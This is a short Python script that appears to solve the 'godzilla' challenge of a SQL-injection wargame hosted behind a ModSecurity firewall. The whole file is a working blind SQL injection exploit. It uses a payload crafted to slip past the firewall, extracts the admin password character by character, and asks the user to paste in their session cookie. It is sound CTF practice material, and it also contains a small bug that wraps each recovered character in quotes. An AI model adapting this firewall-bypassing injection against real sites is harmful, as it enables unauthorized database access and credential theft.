import requests

length=8
answer = ""

url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?"
cookie = {"PHPSESSID":'YOUR COOKIE VALUE'} #본인의 cookie 값을 코드에 입력

for i in range(1, length+1):
    for j in range(48,128):
        query = url+"pw='<@=1 or id='admin' and ord(substr(pw, {}, 1)) = '{}'%23".format(i, j)
        req = requests.get(query, cookies=cookie)
        print(query)

        if 'Hello admin' in req.text:
            answer += ascii(chr(j))
            print("Found index : "+str(i),":",answer)
            break

print("password : ", answer)
        
